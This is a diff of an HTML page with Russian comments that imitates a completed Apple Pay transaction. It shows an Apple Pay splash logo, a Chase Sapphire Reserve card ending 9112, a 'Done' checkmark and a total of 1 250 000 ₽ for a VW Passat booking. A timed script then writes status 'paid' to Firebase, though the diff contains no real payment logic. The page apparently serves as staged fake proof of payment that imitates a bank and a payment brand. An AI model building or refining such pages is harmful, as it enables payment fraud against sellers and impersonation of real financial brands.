@@ -30,6 +30,53 @@
             user-select: none;
         }
 
+        /* --- ЭКРАН ЗАГРУЗКИ (ЛОГОТИП APPLE PAY) --- */
+        .splash-screen {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000; /* Самый верхний слой */
+            transition: opacity 0.6s ease;
+        }
+
+        .apple-pay-logo {
+            width: 130px; /* Размер логотипа */
+            height: auto;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            animation: fadeIn 0.8s ease;
+        }
+
+        .apple-pay-logo svg.apple { width: 40px; fill: white; }
+        .apple-pay-logo span.pay-text { font-size: 38px; font-weight: 700; color: white; letter-spacing: -0.5px; }
+
+        /* Скрываем загрузку */
+        .splash-screen.hidden {
+            opacity: 0;
+            pointer-events: none; /* Чтобы не мешал кликам */
+        }
+
+        /* --- ОСНОВНОЙ КОНТЕНТ (КАРТА И ІНТЕРФЕЙС) --- */
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100%;
+            width: 100%;
+            opacity: 0; /* Скрыто по умолчанию */
+            transition: opacity 0.6s ease 0.4s; /* Появляется после скрытия сплэша */
+        }
+
+        /* Показываем контент */
+        .main-content.visible {
+            opacity: 1;
+        }
+
         /* --- ЧЕРНАЯ КАРТА CHASE (Визуал) --- */
         .card-visual {
             width: 90%;
@@ -65,12 +112,12 @@
         /* ОБНОВЛЕННЫЙ СТИЛЬ ДЛЯ ТВОЕГО ЛОГОТИПА */
         .visa-logo-img { 
             position: absolute; 
-            bottom: 15px; /* Чуть выше, чтобы смотрелось аккуратно */
+            bottom: 15px; 
             right: 20px; 
-            width: 60px; /* Размер логотипа */
+            width: 60px; 
             height: auto; 
             opacity: 0.95; 
-            object-fit: contain; /* Сохраняет пропорции картинки */
+            object-fit: contain; 
         }
 
         /* --- СИНЕЕ КОЛЬЦО И АНИМАЦИЯ --- */
@@ -151,49 +198,59 @@
 
         /* АНИМАЦИИ ПОЯВЛЕНИЯ */
         @keyframes fadeInDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
 
     </style>
 </head>
 <body>
 
-    <div class="card-visual">
-        <div style="display: flex; align-items: center; gap: 10px;">
-            <svg class="card-logo" viewBox="0 0 24 24" fill="white"><path d="M2 2v20h20V2H2zm18 18H4V4h16v16zM6 6h4v4H6V6zm8 0h4v4h-4V6zm-8 8h4v4H6v-4zm8 0h4v4h-4v-4z"/></svg>
-            <div style="display: flex; flex-direction: column;">
-                <span style="font-size: 15px; font-weight: 700; color: white;">SAPPHIRE</span>
-                <span class="card-type">RESERVE</span>
+    <div class="splash-screen" id="splashScreen">
+        <div class="apple-pay-logo">
+            <svg class="apple" viewBox="0 0 24 24"><path d="M12.152 6.896c-.948 0-2.407-1.078-3.344-1.028-1.23.064-2.362.759-2.994 1.86-1.278 2.235-.328 5.551.914 7.345.607.879 1.327 1.854 2.276 1.82 1.232-.047 1.371-.806 2.871-.803 1.499.006 1.621.803 2.874.779.951-.021 1.583-.895 2.189-1.78.702-1.018.991-2.003 1.005-2.053-.032-.016-1.929-.734-1.947-2.926-.014-1.843 1.512-2.731 1.581-2.766-.856-1.254-2.192-1.396-2.67-.145v.001zm-.72 4.103c.123 1.137-.367 2.271-1.254 2.927.854-.87 1.37-2.002 1.254-2.927zm2.463-5.02c.604-.736.985-1.761.85-2.791-.913.036-2.016.608-2.671 1.378-.59.691-1.026 1.745-.895 2.765.986.075 2.083-.563 2.716-1.352z"/></svg>
+            <span class="pay-text">Pay</span>
+        </div>
+    </div>
+
+    <main class="main-content" id="mainContent">
+        <div class="card-visual">
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <svg class="card-logo" viewBox="0 0 24 24" fill="white"><path d="M2 2v20h20V2H2zm18 18H4V4h16v16zM6 6h4v4H6V6zm8 0h4v4h-4V6zm-8 8h4v4H6v-4zm8 0h4v4h-4v-4z"/></svg>
+                <div style="display: flex; flex-direction: column;">
+                    <span style="font-size: 15px; font-weight: 700; color: white;">SAPPHIRE</span>
+                    <span class="card-type">RESERVE</span>
+                </div>
             </div>
+            <div class="card-chip"></div>
+            <div class="card-number">.... 9112</div>
+            
+            <img src="visa_white.png" alt="Visa Infinite" class="visa-logo-img">
         </div>
-        <div class="card-chip"></div>
-        <div class="card-number">.... 9112</div>
-        
-        <img src="visa_white.png" alt="Visa Infinite" class="visa-logo-img">
-    </div>
 
-    <div class="status-container" id="statusBlock">
-        <div class="check-ring">
-            <svg viewBox="0 0 24 24">
-                <path d="M20 6L9 17l-5-5"/>
-            </svg>
+        <div class="status-container" id="statusBlock">
+            <div class="check-ring">
+                <svg viewBox="0 0 24 24">
+                    <path d="M20 6L9 17l-5-5"/>
+                </svg>
+            </div>
+            <div class="done-text">Done</div>
         </div>
-        <div class="done-text">Done</div>
-    </div>
 
-    <footer class="payment-info">
-        <div class="info-row">
-            <span>Сайт:</span>
-            <strong>superpro228.github.io</strong>
-        </div>
-        <div class="info-row">
-            <span>Услуга:</span>
-            <strong>Бронирование VW Passat</strong>
-        </div>
-        <div style="margin-top: 15px; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px;">
-            <span style="color: var(--text-primary); font-size: 15px;">Итого:</span>
-            <span class="info-highlight">1 250 000 ₽</span>
-        </div>
-    </footer>
+        <footer class="payment-info">
+            <div class="info-row">
+                <span>Сайт:</span>
+                <strong>superpro228.github.io</strong>
+            </div>
+            <div class="info-row">
+                <span>Услуга:</span>
+                <strong>Бронирование VW Passat</strong>
+            </div>
+            <div style="margin-top: 15px; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px;">
+                <span style="color: var(--text-primary); font-size: 15px;">Итого:</span>
+                <span class="info-highlight">1 250 000 ₽</span>
+            </div>
+        </footer>
+    </main>
 
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
@@ -204,18 +261,30 @@
         firebase.initializeApp(firebaseConfig);
 
         window.onload = function() {
-            // Запускаем анимацию Apple Pay через 0.5 сек после загрузки
-            setTimeout(() => {
-                document.getElementById('statusBlock').classList.add('animated');
-            }, 500);
+            const splash = document.getElementById('splashScreen');
+            const main = document.getElementById('mainContent');
 
-            // Через 3.5 секунды отправляем сигнал на компьютер
+            // 1. Показываем логотип Apple Pay на 1.2 секунды
+            setTimeout(() => {
+                // 2. Скрываем логотип
+                splash.classList.add('hidden');
+                // 3. Показываем карту и интерфейс
+                main.classList.add('visible');
+
+                // 4. Через еще 0.5 сек запускаем анимацию синего кольца и галочки
+                setTimeout(() => {
+                    document.getElementById('statusBlock').classList.add('animated');
+                }, 500);
+
+            }, 1200);
+
+            // 5. Через 4.2 секунды (с учетом заставки) отправляем сигнал на компьютер
             setTimeout(() => {
                 firebase.database().ref('payment').set({ 
                     status: 'paid', 
                     time: Date.now() 
                 });
-            }, 3500); 
+            }, 4200); 
         };
     </script>
 </body>
